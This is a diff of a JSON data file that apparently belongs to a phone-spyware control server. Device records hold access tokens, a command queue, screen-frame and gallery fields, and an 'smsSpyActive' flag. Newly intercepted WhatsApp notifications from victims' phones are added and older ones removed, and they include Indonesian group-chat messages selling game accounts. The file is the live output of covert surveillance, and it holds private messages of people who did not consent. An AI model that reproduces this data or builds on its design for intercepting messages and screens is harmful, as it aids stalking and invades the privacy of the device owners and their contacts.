@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776781285718,
+    "lastSeen": 1776781290593,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -6329,6 +6329,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎GB ZUNZ PEKALONGAN (1018 pesan): ~ SAKHA #1",
+        "content": "TAWARIN EPEP DANA 150K",
+        "time": "21/04 21:21",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781288737
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎2916 pesan dari 16 chat",
+        "time": "21/04 21:21",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781288722
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎2915 pesan dari 16 chat",
+        "time": "21/04 21:21",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781288027
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎GB ZUNZ PEKALONGAN (1017 pesan): ~ zall str",
@@ -10304,30 +10328,6 @@
         "time": "21/04 20:54",
         "pkg": "com.whatsapp",
         "receivedAt": 1776779683331
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎3641 pesan dari 22 chat",
-        "time": "21/04 20:54",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776779667991
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎STOCK¹ NEW DAVID 18 STR X OWN (129 pesan): ~ kaisar",
-        "content": "📷 STOK PRIBADI KAISAR!!\n`SG2, 4RASA,EVO,TEROMPET MAMBA, EVO 4 MAX 2, SG EVO,TINJU MAX, TROMSON LEVEL 5, MP5 LEVEL 4, VAULT 230++, FACE J V2 ON, BOYAH PAS 6, CELANA GENJI PUTIH, ENJLE MERAH X UNGU, CELANA GAJAH, BUNDLE FFWS 2025 ON, NYEKER  TINJU 2 ,EMOT PANTAI ON ANIMASI 2, EMOT KECE\" KAKASIH PUTIH X HITAM X PUTIH DLL.. PM` OP?? 300K\n\n-GGL BIND OTW SEPAKET\n-GARANSI 15H",
-        "time": "21/04 20:54",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776779667854
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎3640 pesan dari 22 chat",
-        "time": "21/04 20:54",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776779646969
       }
     ],
     "galleryPhotos": [],
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776781284944,
+    "lastSeen": 1776781290880,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
@@ -16704,6 +16704,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "kimm ade' an",
+        "content": "🎥 Video (1.38)",
+        "time": "21/04 21:21",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781290968
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
